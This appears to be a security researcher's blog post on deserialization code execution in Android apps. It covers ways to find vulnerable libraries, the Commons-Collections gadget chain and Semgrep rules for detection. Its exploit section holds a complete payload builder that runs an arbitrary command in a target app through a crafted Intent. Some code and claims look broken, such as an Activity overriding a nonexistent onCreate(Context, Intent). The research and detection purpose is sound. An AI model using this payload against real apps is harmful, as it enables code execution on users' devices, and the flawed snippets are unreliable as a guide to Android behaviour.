---
layout: post
title: "Deep dive on Android Java / Kotlin Deserialization Code Execution with Semgrep Detection"
categories: [security, android, android-security]
tags: [programming, productivity]
description: "Code Execution via Java & Kotlin Deserialization in Android Application"
comments: true
---


### Overview

In this post, we will explore code execution using Java & Kotlin Deserialization in Android Application. Additionally, We will discuss the Gadget Chain, Detection and Exploitation technique specific to Android. Achieving code execution in server side application via Java deserialization has higher chance of success than in client side android application. This is due to limitation of variety of loaded classes in android application. For instance `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` is available in openJDK but not in Android JDK (but with modification). These limitation can be a blocker for loading arbitrary classes and executing payload (mostly compiled bytecode) in Android application. Well there are lot of deserialization vulnerabilities is published out there such as

1. Jackson (Jackson databind) Deserialization with crafted JSON
2. Apache Commons-collections Deserialization with crafted payload
3. Fastjson Deserialization with crafted JSON (CVE-2022-25845)

One of the advantage of Android application is that when the Intent `getIntent()` is invoked with `intent.getStringExtra()` which is common for activities to accept data from other activities/services/broadcast, the data is automatically deserialized and passed to the activity. This is a very powerful feature of Android application. Additionally, when the application is launched, the classes are automatically added to classpath/loaded which perfectly fits the requirement of deserialization.

### Identify Applications with Vulnerable libraries

#### Through Sourcegraph Search

While there are several ways to identify application with vulnerable dependencies, my favourite way is to perform a search on Sourcegraph applying multiple filters to drill down to Android repositories containing the vulnerable libraries.

##### Example search:

```shell
context:global commons-collections:3.1 repohasfile:AndroidManifest.xml file:build.gradle -repo:^github\.com/sonatype-nexus-community/scan-gradle-plugin$ 
```
#### Through Decompilation

For bugbounty hunters & researchers, the above ways have been already leveraged to identify vulnerable applications. The other way is to decompile the application (APK) and basically traversing directory structures to identify and match with Vulnerable opensource libraries.

##### Example

If apache `commons-collections:3.1` is compiled with the Android APK, the directory structure after decompilation will be something like this `org/apache/commons/collections/functors/InvokerTransformer.class` which can be identified by traversing the directory structure. You could go one step ahead and search for `MANIFEST.MF` file to identify the version of the library.

#### Through Open source License Analysis

Often Enterprise Android apps are distributed with open source libraries. You could perform license analysis on the APK to identify the open source libraries and versions. Often it should be `license.md` file after decompiling the application.

#### Through Dynamic Analysis

While there different methods to perform this dynamic analysis on Android application, I will be using Frida for listing all loaded classes. Note that this method mostly doesn't output version of the library but if the library supports getVersion kind of method, you could easily identify the version.

```javascript
// Get list of loaded Java classes and methods

// Filename: java_class_listing.js

Java.perform(function() {
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            console.log(className);
            describeJavaClass(className);
        },
        onComplete: function() {}
    });
});

// Get the methods and fields
function describeJavaClass(className) {
  var jClass = Java.use(className);
  console.log(JSON.stringify({
    _name: className,
    _methods: Object.getOwnPropertyNames(jClass.__proto__).filter(function(m) {
      return !m.startsWith('$') // filter out Frida related special properties
        || m == 'class' || m == 'constructor' // optional
    }),
    _fields: jClass.class.getFields().map(function(f) {
      return( f.toString());
    })
  }, null, 2));
}
```

### Finding Gadgets

Finding gadgets is the crux of exploitation, it requires understanding of the library and the gadget chain. One simple way is to use [GadgetInspector)(https://github.com/JackOfMostTrades/gadgetinspector). The other way is to identify vulnerable sinks in the library such as `Runtime.exec` or invoking implementation of serialized class using reflection or `Class.forName` and then invoking `newInstance`. The second method is rare and requires lot of reading and understanding of the library. A good example is `CVE-2022-25845` - Fastjson Auto Type Bypass RCE vulnerability.

### Gadget Chain

While it's possible with some extra steps to perform the same with `commons-collection:4.0`, Lets take apache `commons-collection:3.1` library as example for the deserialization gadget chain. Basically, InvokerTransformer accepts object and invokes given method with arguments. But the chain starts with Java's collections library which is `java.util.HashMap` and `java.util.HashSet`. While trying to deserialize the received object, the transformer is invoked to compute the HashMap key which inturn is abused to execute Runtime.exec command.

```
ObjectInputStream.readObject()
  -> HashSet.readObject()
     -> HashMap.put()
        -> TiedMapEntry.<init>(Map, Object)
           -> TiedMapEntry.getValue()
              -> LazyMap.get(Object)
                 -> ChainedTransformer.transform(Object)
                    -> ConstantTransformer.transform(Object) // Returns Runtime.class
                       -> InvokerTransformer.transform(Object) // Calls getRuntime on Runtime.class
                          -> InvokerTransformer.transform(Object) // Invokes getRuntime, getting Runtime instance
                             -> InvokerTransformer.transform(Object) // Executes command on Runtime instance
                                -> Runtime.exec(String command)
```

### Exploit

In Android Application layer, the application is sandboxed and you cannot execute commands directly. The exploit is delivered via `Intent` as serializable content and then the target process which receives the intent and deserializes the intent and executes the payload. 

![Android Deserialization Vulnerability](/assets/media/deserialization-android-vuln.png)

#### Sender App (Malicious)

Borrowing the gadget from `frohoff/YsoSerial` and Intent from `modzero/modjoda`, we can craft the payload. The `getObject` is invoked from `Activity` or `Service` with command as payload. Example: `getObject("id")` will execute `id` command on the target process.

```java
public Serializable getObject(final String command) throws Exception {

        final String[] execArgs = new String[] { command };

        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return map;
}
```

#### Target App (Vulnerable)

```java
public class VulnerableActivity extends Activity {
    @Override
    public void onCreate(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        if (extras != null) {
            Log.d(app_name, "intent has extra data");
            for (String extra : extras.keySet()) {
                Log.d(app_name, "processing extra " + extra);
                Log.d(app_name, "sucessfully deserialized " + intent.getStringExtra(extra));
            }
        }
    }
}
```

### Semgrep Rule Detection

My favourite way of scanning opensource repositories (Android: example Signal-Android) is to use Semgrep. Semgrep is a lightweight static analysis tool that can be used to scan the source code for deserialization vulnerabilities. I attempted to use semgrep `join` mode for this example, however it's really painful to write & debug the `on` conditions say  `java-deserialization-parser.$VAR == 'intent.getExtras()'` as string comparision.

```yaml
rules:
  - id: java-deserialization-parser
    pattern: |
      $VAR = intent.getExtras();
    languages:
      - java
    message: |
      Possibility of deserialization vulnerability detected.
  - id: apache-commons-library
    languages:
      - generic
    pattern: |
      compile 'commons-collections:commons-collections:3.2.1'
    message: |
      Possibility of deserialization vulnerability detected.
```

So, I switched to naive approach is to execute `semgrep` and set output format as `json` and verify if the scan triggers both rule and thus it can confirm the presence of deserialization vulnerability.

### Closing Note:

While the deserialization vulnerability is not common in Android application, it's still possible to exploit the application with deserialization vulnerability. The gadget chain and exploitation is different from server side application. The exploitation is delivered via `Intent` as serializable content and then the target process which receives the intent and deserializes the intent and executes the payload. The gadget chain is different from server side application and requires understanding of the library and the gadget chain. I hope this post is helpful for developers & engineers 💻. For bugs or hugs & discussion, DM in [Twitter](https://twitter.com/sshivasurya). Opinions are my own and not the views of my employer.

### Credits

- Modzero/modjoda: https://github.com/modzero/modjoda
- Ffohoff/YsoSerial: https://github.com/frohoff/ysoserial
